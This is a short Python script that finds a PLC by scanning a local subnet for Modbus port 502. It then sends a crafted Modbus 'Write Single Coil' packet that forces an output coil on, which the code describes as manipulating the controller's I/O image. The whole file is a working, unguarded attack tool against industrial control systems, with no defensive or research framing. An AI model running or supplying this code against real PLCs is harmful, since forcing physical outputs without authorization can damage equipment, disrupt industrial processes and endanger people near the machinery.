import socket
import struct
import time

# Function to find the PLC's IP address
def find_plc_ip(network_prefix="192.168.1.", start_range=1, end_range=255):
    for i in range(start_range, end_range + 1):
        ip = network_prefix + str(i)
        try:
            # Attempt to connect to the PLC on a common port (e.g., 502 for Modbus)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((ip, 502))
            s.close()
            print(f"PLC found at IP: {ip}")
            return ip
        except:
            continue
    print("PLC not found in the specified range.")
    return None

# Function to manipulate the I/O image table
def manipulate_io_image(plc_ip):
    try:
        # Create a socket connection to the PLC
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((plc_ip, 502))  # Assuming Modbus TCP port 502

        # Example: Override a specific output coil (e.g., coil address 0x0001)
        modbus_function_code = 0x05  # Write Single Coil
        coil_address = 0x0001  # Address of the coil to override
        coil_value = 0xFF00  # Force the coil ON (0xFF00) or OFF (0x0000)

        # Modbus TCP ADU (Application Data Unit)
        transaction_id = 0x0001
        protocol_id = 0x0000
        length = 0x0006
        unit_id = 0x01

        # Build the Modbus TCP packet
        packet = struct.pack(">HHHBBH", transaction_id, protocol_id, length, unit_id, modbus_function_code, coil_address) + struct.pack(">H", coil_value)

        # Send the packet to the PLC
        s.send(packet)

        # Receive the response from the PLC
        response = s.recv(1024)
        print(f"Response from PLC: {response.hex()}")

        # Close the socket connection
        s.close()

        print(f"Successfully manipulated I/O image on PLC at {plc_ip}")
    except Exception as e:
        print(f"Error manipulating I/O image: {e}")

# Main function
def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    
    if plc_ip:
        # Step 2: Manipulate the I/O image table
        manipulate_io_image(plc_ip)

if __name__ == "__main__":
    main()